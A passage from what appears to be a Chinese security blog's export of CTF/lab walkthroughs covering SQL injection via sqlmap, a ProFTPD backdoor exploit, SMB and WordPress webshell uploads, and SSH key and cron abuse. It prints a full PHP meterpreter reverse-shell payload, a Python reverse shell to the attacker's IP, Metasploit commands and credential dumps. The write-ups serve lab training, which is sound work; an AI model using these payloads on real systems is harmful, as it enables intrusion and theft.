    <content type="text"><![CDATA[Background SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入的大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 任何一个用户可以输入的位置都肯是注入点。比如url中，以及http报文中，头部参数； 简介X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。简单的来说，就是服务器端用来获取客户端真实IP的字段。 X-Forwarded-For格式 1X-Forwarded-For: client1, proxy1, proxy2 X-Forwarded-For包含多个IP地址，每个值通过逗号+空格分开，最左边（client1）是最原始客户端的IP地址，中间如果有多层代理，每一层代理会将连接它的客户端IP追加在X-Forwarded-For右边。 代理方向 1客户端=&gt;正向代理=&gt;透明代理=&gt;服务器反向代理=&gt;Web服务器 &emsp;&emsp;一般的客户端（例如浏览器）发送HTTP请求是没有X-Forwarded-For头的，当请求到达第一个代理服务器时，代理服务器会加上X-Forwarded-For请求头，并将值设为客户端的IP地址（也就是最左边第一个值），后面如果还有多个代理，会依次将IP追加到X-Forwarded-For头最右边，最终请求到达Web应用服务器，应用通过获取X-Forwarded-For头取左边第一个IP即为客户端真实IP。 X-Forwarded-For注入的实现原理：伪造X-Forwarded-For头部，头部内容包含恶意的sql语句 参考博客 X-Forwarded-For的一些理解 利用X-Forwarded-For伪造客户端IP漏洞成因及防范 利用X-Forwarded-For进行sql注入 实验环境 攻击机 Kali： 192.168.43.44 靶场机器 Debian： 192.168.43.93 信息探测探测靶机开放服务及其版本– nmap -sV 192.168.43.97 【开放80端口http服务】 【Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器】 浏览器访问站点页面 发现管理员登陆页面尝试弱口令登陆失败 漏洞扫描使用AWVS扫描站点漏洞（AWVS是一款专业的Web扫描工具）这里直接给出扫描结果发现站点存在sql注入漏洞,可注入的参数X-Forwarded-For 数据库爆破既然知道存在sql注入漏洞就可以用sql注入神器—-sqlmap先做一个简单的探测（-H +增加的头部 –batch 由系统默认参数） 1sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; --batch 果然存在漏洞那么就好办了跑数据库名 1root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; --dbs --batch 跑数据库表名 1root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; -D photoblog --tables --batch 跑列名 1root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; -D photoblog -T users --columns --batch 跑字段 1root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; -D photoblog -T users -C login,password --dump --batch 获得管理员账号，就可以登陆后台了]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SQL注入（POST参数注入）]]></title>
    <url>%2F2019%2F08%2F27%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SQL%E6%B3%A8%E5%85%A5%EF%BC%88POST%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Background SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入的大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 任何一个用户可以输入的位置都肯是注入点。比如url中，以及http报文中，POST传递的参数； 实验环境 攻击机 Kali：192.168.43.44 靶场机器 Ununtu 14.04 ： 192.168.43.97 目的：获得靶机root权限 信息探测探测靶机开放的服务– nmap -sV 192.168.43.97 发现靶机80、8080端口开放http服务 既然开放了http服务就试着浏览器访问一下或查看源代码80端口开放的web站点只有一张图片8080端口开口的web站点是一个购物站点 尝试扫描站点下的网页 1root@kali:~# nikto -host http://192.168.43.97 1root@kali:~# dirb http://192.168.43.97:8080 发现管理员登陆页面 漏洞扫描管理员界面尝试弱口令失败；扫一下有没有sql注入漏洞burpsuite抓包 sqlmap扫描 1root@kali:~# sqlmap -r test/post.txt --level 5 --risk 3 --dbs --batch 这里普通标准的扫描无法扫出sql漏洞，需要提高扫描等级（–level 5 –risk 3）数据库名已经跑出来这里发现8080端口站点使用的数据库wordpress8080所以这里选择这个数据库接下来就是跑出表名 1root@kali:~# sqlmap -r test/post.txt --level 5 --risk 3 -D wordpress8080 --tables --batch 跑列名 1root@kali:~# sqlmap -r test/post.txt --level 5 --risk 3 -D wordpress8080 -T users --columns --batch 跑字段 1root@kali:~# sqlmap -r test/post.txt --level 5 --risk 3 -D wordpress8080 -T users -C username,password --dump --batch 密码已经跑出来了 登陆管理员后台右键浏览器打开，输入账号密码，登陆后台 上传webshell需要一个webshell在/usr/share/webshells/php中选择php-reverse-shell.php 找到404页面（Appearance-&gt;Editor-&gt;404.php）替换成shell点击update file，提交 wordpress 上传点 theme 404.php执行：http://靶场IP/wordpress/wp-content/themes/主题名/404.php 浏览器打开网页，执行上传的shell 1http://192.168.43.97:8080/wordpress/wp-content/themes/twentythirteen/404.php kali 用nc监听4444端口– nc -vlp 4444 提升权限用python优化shell提权root权限，密码尝试空密码或SuperSecretPassword登陆成功，获得靶机root权限]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SQL注入（GET参数注入）]]></title>
    <url>%2F2019%2F08%2F25%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SQL%E6%B3%A8%E5%85%A5%EF%BC%88GET%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Background SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入的大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 SQL注入的产生原因通常表现在以下几个方面： 不当的类型处理； 不安全的数据库配置； 不合理的查询集处理； 不当的错误处理； 转义字符处理不合适； 多个提交处理不当； 实验环境攻击机： 192.168.43.44靶场机器： 192.168.43.201 信息探测扫描主机服务信息以及版本– nmap -sV 192.168.43.44 发现开放了ssh、http服务 探测敏感信息探测http服务隐藏的目录文件– nikto -host 192.168.43.201 发现一个管理员登陆页面这里可以尝试可不可以弱口令登陆，不过失败了 漏洞扫描 OWASP ZAP，全称：OWASP Zed Attack Proxy攻击代理服务器是世界上最受欢迎的免费安全工具之一。ZAP可以帮助我们在开发和测试应用程序过程中，自动发现 Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。 用OWASP-ZAP对这个站点进行扫描输入url开始攻击，等待扫描完成发现一个get请求的url存在sql注入漏洞（存在漏洞参数：id） 数据库爆破知道存在sql注入漏洞，就用sqlmap来爆破站点的数据库爆数据库 1root@kali:~# sqlmap -u &quot;http://192.168.43.201/cat.php?id=1&quot; --dbs 发现两个数据库，一个是元数据库，那么另一个就是站点的数据库了接下来就是表名和列名了爆表名【categories|pictures|users】 1sqlmap -u &quot;http://192.168.43.201/cat.php?id=1&quot; -D photoblog --tables 爆列名【id|login|password】 1root@kali:~# sqlmap -u &quot;http://192.168.43.201/cat.php?id=1&quot; -D photoblog -T users --columns 爆字段内容 1root@kali:~# sqlmap -u &quot;http://192.168.43.201/cat.php?id=1&quot; -D photoblog -T users -C login,password --dump 获得管理员账号密码 账号：admin 密码：P4ssw0rd 上传webshell获取了管理员权限，尝试获取shell试着上传webshell有时候也可以通过sqlmap直接获取shell（数据库管理账号权限足够大） 1sqlmap -u &quot;http://192.168.43.201/cat.php?id=1&quot; --os-shell 发现一个上传点（虽然是图片，但是可能上传文件格式并没有做什么限制） 制作一个php语言的webshell将代码保存成一个Webshell.php文件点击上传发现上传失败，试着修改后缀为大写PHP(webshell.PHP) 上传成功 获取shell用msf工具监听获取返回的shell 12345msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; show options msf5 exploit(multi/handler) &gt; set LHOST 192.168.43.44 //默认端口4444msf5 exploit(multi/handler) &gt; run 访问刚刚上传的“图片”再回来看返回的shell 此时就获得了网站的shell；]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-Capture the flag]]></title>
    <url>%2F2019%2F08%2F23%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-Capture-the-flag%2F</url>
    <content type="text"><![CDATA[Background CTF（Capture The Flag）是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。 实验环境攻击机 kali： 192.168.0.106靶场机器 linux： 192.168.0.108 目的：获取靶机flag 信息探测 扫描主机开放的端口号 1nmap -p- -T4 靶场IP地址 快速扫描主机全部信息 1nmap -T4 -A -v 靶场IP地址 扫描常用服务开放了ftp、ssh、http服务扫描开放的端口 靶机开放端口【21(ftp)、22(ssh)、80(http)、9090(ze)、13337、22222、60000】 【注：EasyEngine是一个来自国外的建站环境一键安装脚本，支持一键部署NGINX、MySQL、Postfix、PHP 7建站环境和安装WordPress博客程序，而且还能智能化选择WordPress的缓存模式、自动部署Let’s Encrypt的SSL证书等等。】 端口分析 对于大端口非http服务，可以用nc来探测该端口的banner信息 1nc IP地址 端口号 对于大端口http服务，可以使用浏览器浏览界面、查看源代码，寻找flag值 1http://ip地址：端口号 根据扫描结果，发现两个大端口的未知的服务（13337、60000）可以用nc探测端口的banner信息探测13337端口 直接返回一个flag，这是就发现了第一个flagFLAG:{TheyFoundMyBackDoorMorty}-10Points 探测60000端口直接返回一个shell，在目录下发现flag文件第二个flagFLAG{Flip the pickle Morty!} - 10 Points 【banner信息：表示欢迎语，有时会含有敏感信息，比如系统版本信息等；banner 信息获取的基础是在和目标建立链接后的，只有建立的链接，才可以获取到相应的 banner 信息】 探测敏感信息12nikto -host http://靶场IP：端口dirb http://靶场IP：端口 80、9090端口是http服务，可通过先网页直接访问80端口网页和源代码没有发现可用信息9090端口网页发现第三个flagFLAG {There is no Zeus, in your face!} - 10 Points 因为靶机还开放了21端口ftp服务尝试网页浏览，看看是否能匿名登陆 1ftp://靶场IP 发现一个flag文件第四个flagFLAG{Whoa this is unexpected} - 10 Points 网页方式访问完，接下来对隐藏文件进行探测【password目录、robots文件等】 发现一个passwords目录，打开目录打开flag文件第五个flagFLAG{Yeah d- just don’t do it.} - 10 Points打开passwords.html发现一段英文，意思大概是密码在这个文件中，它被隐藏了查看源码发现一个密码：winter（后面可能会用到） 查看robots文件，访问文件中显示的文件发现一个用于IP tracer的cgi文件可能含有命令执行漏洞 果然不错，不过获得权限不大；因为之前得到了一个密码，所以可以查看有没有其他账号（/etc/passwd）这里用cat 命令好像被屏蔽了，可用用more 命令代替【三个账号名称：RickSanchez、Morty、Summer】从密码winter来看用户名应该就是Summer 登陆靶机登陆靶机一般用ssh进行登陆靶机不允许远程登陆想到之前扫描开放的端口22222尝试指定端口登陆登陆成功查看flag（使用cat命令就会显示一只猫）第六个flagFLAG{Get off the high road Summer!} - 10 Points 总结 注意未知服务的端口,可以使用nc获取对应的banner信息； 使用对应相近的shell命令来绕过限制； 如 cat more 对每一个服务都需要进行对应的探测，不放过任何一个可以利用的点；]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-FTP服务后门利用]]></title>
    <url>%2F2019%2F08%2F22%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Background 文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。FTP允许用户以文件操作的方式（如文件的增、删、改、查、传送等）与另一主机相互通信。然而， 用户并不真正登录到自己想要存取的计算机上面而成为完全用户， 可用FTP程序访问远程资源， 实现用户往返传输文件、目录管理以及访问电子邮件等等， 即使双方计算机可能配有不同的操作系统和文件存储方式。 FTP端口号是：21 默认情况下FTP协议使用TCP端口中的 20和21这两个端口，其中20用于传输数据，21用于传输控制信息。但有时数据端口不一定是20，这和FTP的应用模式有关，如果是主动模式，应该为20，如果为被动模式，由服务器端和客户端协商而定。 实验环境 攻击机 Kali： 192.168.0.106 靶机 Ubuntu： 192.168.0.105 目的： 获取靶机root权限 信息探测扫描主机服务信息以及服务版本 1nmap -sV 靶场IP地址 快速扫描主机全部信息 1nmap -T4 -A -v 靶场IP 发现靶机开放了ftp服务，并且有相应的版本信息。（ProFTPD:一个Unix平台上或是类Unix平台上（如Linux, FreeBSD等）的FTP服务器程序。） 发现漏洞 分析nmap扫描结果，挖掘可以利用的信息； 使用seachsploit，查看漏洞信息，找到可利用的溢出代码；1root@kali:~# searchsploit ProFTPD 1.3.3c 发现ProFTPD 1.3.3c存在漏洞，并且在msf中集成了可用的EXP; msf利用漏洞123456789msf5 &gt; search ProFTPD 1.3.3c //搜索可用的模块msf5 &gt; use exploit/unix/ftp/proftpd_133c_backdoor // 使用模块msf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads // 显示可用的payloadmsf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; set payload cmd/unix/reverse // 设置payloadmsf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options // 查看配置项msf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; set rhosts 192.168.0.105 // 设置靶机IPmsf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; set lhost 192.168.0.106 // 设置攻击者IPmsf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options // 确认配置项msf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit // 发送利用代码 查询是否有可利用的模块 使用模块，并查询可用的payload 设置payload（cmd/unix/reverse），查看需要填写的配置项 设置IP地址 发送利用代码 因为交互的方式对用户不是很友好，可用python进行优化输入以下命令 1python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot; 总结 对于开放FTP、SSH、Telnet等服务的系统，可以尝试一些对应服务版本的漏洞利用代码； 对于系统，一定要注意利用现成的EXP来root主机；]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SMB服务信息泄露]]></title>
    <url>%2F2019%2F08%2F19%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SMB%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%2F</url>
    <content type="text"><![CDATA[Background SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。 后来Linux移植了SMB，并称为samba。SMB用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居J就是由它实现。SMB协议是基于TCP－NETBIOS下的，一般端口使用为139，445。 实验环境 攻击机：Kali - 192.168.0.105 靶场机器： linux - 192.168.0.106 目的： 获取靶机flag 信息探测对于只是给定一个IP地址的靶场机器，我们需要用对其进行扫描，探测开放的服务。渗透其实是针对服务的漏洞探测，然后进行对应的数据包发送，获取机器的最高权限。 nmap -SV IP 挖掘开放服务信息 nmap -A -v -T4 IP 挖掘靶场全部信息 靶机开口的服务【22（ssh）、80（http）、139，445（smb）、3306（mysql）等】 SMB协议弱点分析 针对SMB协议，使用空口令尝试登陆，并查看敏感文件，下载查看 123smbclient -L IP //列出某个IP地址所提供的共享文件夹smbclinet &apos;\\IP\$share&apos;get 敏感文件 针对SMB协议远程溢出漏洞进行分析。 1searchsploit samba版本号 查看靶机的共享文件发现share文件可以访问通过get 下载敏感文件文件钟有一个密码12345发现配置文件配置文件中有mysql账户名密码（Admin、TogieMYSQL12345^^）；尝试登陆mysql 登陆失败，服务器端不接受远程登陆尝试ssh登陆，登陆失败注：WordPress是使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。 http协议弱点分析 浏览器查看网址 使用dirb或nikto探测 寻找突破的目标，登陆后台，上传webshell dirb扫描目录发现wordpress后台管理页面登陆之前的账号密码（Admin、TogieMYSQL12345^^）成功登陆后台我们可以上传一个webshell来达到控制机器的目的 制作webshell因为后台是php编写的，所以我们上传一个php的shell 1root@kali:~/test# msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.105 lport=4444 -f raw 1&lt;?php /**/ error_reporting(0); $ip = '192.168.0.105'; $port = 4444; if (($f = 'stream_socket_client') &amp;&amp; is_callable($f)) &#123; $s = $f("tcp://&#123;$ip&#125;:&#123;$port&#125;"); $s_type = 'stream'; &#125; if (!$s &amp;&amp; ($f = 'fsockopen') &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = 'stream'; &#125; if (!$s &amp;&amp; ($f = 'socket_create') &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = 'socket'; &#125; if (!$s_type) &#123; die('no socket funcs'); &#125; if (!$s) &#123; die('no socket'); &#125; switch ($s_type) &#123; case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') &amp;&amp; ini_get('suhosin.executor.disable_eval')) &#123; $suhosin_bypass=create_function('', $b); $suhosin_bypass(); &#125; else &#123; eval($b); &#125; die(); 上传webshell使用找到的明信息登陆系统后台，上传webshell，执行webshell（访问具有webshell的php页面） 获得反弹的shell wordpress 上传点 theme 404.php执行：http://靶场IP/wordpress/wp-content/themes/twentyfifteen/404.php 找到404页面（Appearance-&gt;Editor-&gt;404.php）替换源代码 用msf打开监听端口 12345msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost=192.168.0.105msf5 exploit(multi/handler) &gt; show options msf5 exploit(multi/handler) &gt; run 浏览器打开404网页 执行webshell 1http://192.168.0.106/wordpress/wp-content/themes/twentyfifteen/404.php 接受到一个shell 优化shell 查看所有用户 发现一个用户togie切换用户，尝试密码12345 sudo切换为root用户，查看flag 12345678910111213141516171819202122232425262728togie@LazySysAdmin:/var/www/html/wordpress/wp-content/themes$ sudo -ssudo -sroot@LazySysAdmin:/var/www/html/wordpress/wp-content/themes# ls /rootls /rootproof.txtroot@LazySysAdmin:/var/www/html/wordpress/wp-content/themes# cat /root/proof.txt&lt;html/wordpress/wp-content/themes# cat /root/proof.txt WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851Well done :)Hope you learn&apos;t a few things along the way.Regards,Togie McdogieEnjoy some random stringsWX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT98512d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7pf%&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19puroot@LazySysAdmin:/var/www/html/wordpress/wp-content/themes# 总结 对于开放139和445端口的机器移动要注意是否可以直接使用smbclient登陆到共享目录查找敏感文件； 一般情况下flag值都在/root目录下，并且都在/root目录下，并且需要提升root权限才能查看；]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SSH服务渗透]]></title>
    <url>%2F2019%2F08%2F13%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SSH%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[Background SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。 SSH是一般是基于TCP 22号端口的服务 SSH协议认证机制 基于口令的安全验证 &emsp;&emsp;只要你知道自己帐号和口令，就可以登录到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想连接的服务器。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人”这种方式的攻击。 基于密匙的安全验证 &emsp;&emsp;需要依靠密匙，也就是你必须为自己创建一对密匙，并把公用密匙放在需要访问的服务器上。如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的密匙进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用密匙，然后把它和你发送过来的公用密匙进行比较。如果两个密匙一致，服务器就用公用密匙加密“质询”（challenge）并把它发送给客户端软件。客户端软件收到“质询”之后就可以用你的私人密匙解密再把它发送给服务器。 用这种方式，你必须知道自己密匙的口令。但是，与第一种级别相比，第二种级别不需要在网络上传送口令。 一般id_rsa为私钥，id_rsa.pub为公钥； 认证机制弱点 基于口令的安全验证 &emsp;&emsp;基于字典的暴力破解，破解对应用户名和密码，通过SSH客户端连接到远程主机的SSH服务，实现对服务器的控制。（不一定是root权限） 基于密匙的安全验证 &emsp;&emsp;通过对主机的信息收集获取到泄露的用户名和对应的密钥。 chmod 600 id_rsa ssh -i id_rsa 用户名@主机地址 登陆服务器。（不一定是root权限） 实验环境攻击机：Kali - 192.168.0.105靶场机器： linux - 192.168.0.107 目的： 获取靶机root权限 信息探测对于给定IP地址的靶场机器，对其进行渗透测试，首先需要考虑靶场机器开放的服务。 探测靶场开放的服务与服务的版本 – nmap -sV 靶场IP地址 探测靶场的全部信息 – nmap -A -v 靶场IP地址 探测靶场的操作系统类型与版本 – nmap -O 靶场IP地址 发现目标靶机开放了http、ssh服务对于ssh服务的22端口，首先考虑 1.暴力破解 2.私钥泄露（私钥有没有对应的密码、是否可以找到私钥的用户名） 对于http服务的80端口或其他端口 通过浏览器访问对应的http服务，如http://ip:port 使用工具对目录进行探测，如dirb http://ip:port/注意特殊的端口（大于1024） 挖掘敏感信息 使用浏览器对靶场IP的http服务进行探测，对于页面展示的内容也要注意，尤其是联系人等信息（可能就是用户名）,递归访问，争取遍历到每一个目录 尤其对robots.txt、以及一些目录的访问，挖掘具备利用价值的信息，对于开放ssh服务的靶机，要注意是否泄露了私钥（id_rsa） 发现了一些联系人的信息（Martin、Hadi、Jimmy） 对目录进行探测发现了很多文件，通过网页进行访问发现了私钥信息 对于某些靶场，也可以通过nikto扫描器来挖掘敏感信息– nikto -host 靶场IP 特别注意config等特殊敏感文件 利用敏感、弱点信息对挖掘到的ssh密钥利用 修改id_rsa的权限 chmod 600 id_rsa 利用私钥登陆服务器 ssh -i id_rsa 用户名@靶场IP地址 注意：如果id_rsa没有解密密码，可以直接使用。但是如果id_rsa有解密密码那么需要进行对应的破解 可以用wget将文件下载下来 1root@kali:~/test# wget http://192.168.0.107/icons/VDSoyuAXiO.txt 修改文件名并赋予相应权限 连接到靶机服务器（这里尝试使用联系人作为用户名） 1root@kali:~/test# ssh -i id_rsa martin@192.168.0.107 扩大战果登陆服务器之后，我们可以做以下操作 查看当前用户 whoami id 查看当前用户权限 查看 根目录 寻找flag文件 如果是root权限，那么表明这个靶场就被全部拿下。但是如果不是，就肯定需要提权。一般情况，flag文件只属于root用户和对应的用户组 1234cat /etc/passwd 查看所有用户的列表cat /etc/group 查看用户组find / -user 用户名 查看属于某些用户的文件/tmp 查看缓冲文件目录 我们可以通过以上命令，尝试获取一些有用的信息 深入挖掘通过/etc/crontab文件，设定系统定期执行的任务，编辑，需要root权限。不同的用户都可以有不同的定时任务 cat /etc/crontab 挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对应靶场机器的某个文件。 如果在/etc/crontab下有某个用户的定时计划文件，但是具体目录下没有这个定时的执行文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。 如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否具有读写权限。 参考博客 Linux定时任务Crontab命令详解 /etc/crontab文件和crontab -e命令区别查看定时执行文件，发现jimmy用户每5分钟会执行一次python脚本但是在tmp目录下除一些隐藏文件外，并没有任何脚本123456789martin@debian:/tmp$ ls -altotal 28drwxrwxrwt 7 root root 4096 août 16 13:05 .drwxr-xr-x 21 root root 4096 avril 26 2017 ..drwxrwxrwt 2 root root 4096 août 16 12:09 .font-unixdrwxrwxrwt 2 root root 4096 août 16 12:09 .ICE-unixdrwxrwxrwt 2 root root 4096 août 16 12:09 .Test-unixdrwxrwxrwt 2 root root 4096 août 16 12:09 .X11-unixdrwxrwxrwt 2 root root 4096 août 16 12:09 .XIM-unix 所以我们可以自行编写，再让它执行 反弹shell靶场代码 123456789#!/usr/bin/pythonimport os,subprocess,sockets = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect(("192.168.0.105",4444))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p = subprocess.call(["/bin/sh","-i"]) 攻击机netcat命令– nc -lvp 为占用端口 1查看占用端口 netstat -pantu 可以通过netcat将脚本发到靶机 netcat传输文件用法 先在本地启动发送命令（直接发送给靶机会被防火墙，所以在本地开放端口，让靶机主动连接即可） 1root@kali:~/test# nc -l 4445 &lt;1.py //从本地打开4445端口发送文件，等待连接 靶机连接，下载文件 12345678910111213141516martin@debian:/tmp$ nc 192.168.0.105 4445 &gt;1.py //连接kali，下载文件martin@debian:/tmp$ martin@debian:/tmp$ ls1.pymartin@debian:/tmp$ cat 1.py #!/usr/bin/pythonimport os,subprocess,sockets = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;192.168.0.105&quot;,4444))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p = subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])martin@debian:/tmp$ 然后kali监听4444端口将1.py重命名为sekurity.py,并添加可执行权限等待一段时间~ 发现jimmy连接了我们的shell，但是很可惜jimmy也不是root权限，所以只能从最后一个用户Hadi入手 暴力破解万不得已的时候 只能对ssh服务进行暴力破解。破解最后一个用户名。破解工具如hydra、medusa等。 这里我们用cupp生成字典，再使用metasploit破解ssh cupp是生成的是社工字典，跟据输入的信息生成密码，（回车跳过输入） 1root@kali:~/test# cupp3 -i //-i 交互模式 打开msf渗透测试框架 1root@kali:~/test# msfconsole 这里要用到ssh_login模块，可以用search搜索 1msf5 &gt; search ssh_login use使用模块 1msf5 &gt; use auxiliary/scanner/ssh/ssh_login 显示配置项 show options 1msf5 auxiliary(scanner/ssh/ssh_login) &gt; show option 配置相关选项 12345678910msf5 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 192.168.0.107RHOSTS =&gt; 192.168.0.107msf5 auxiliary(scanner/ssh/ssh_login) &gt; set USERNAME hadiUSERNAME =&gt; hadimsf5 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE hadi.txtPASS_FILE =&gt; hadi.txtmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set THREADS 10THREADS =&gt; 10msf5 auxiliary(scanner/ssh/ssh_login) &gt; show options msf5 auxiliary(scanner/ssh/ssh_login) &gt; run 破解出密码 根据提示，打开session会话 打开的session会话，交互模式不是很好利用python进行优化 1python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot; 提升权限，查看flag]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SSH私钥泄露]]></title>
    <url>%2F2019%2F08%2F07%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SSH%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2%2F</url>
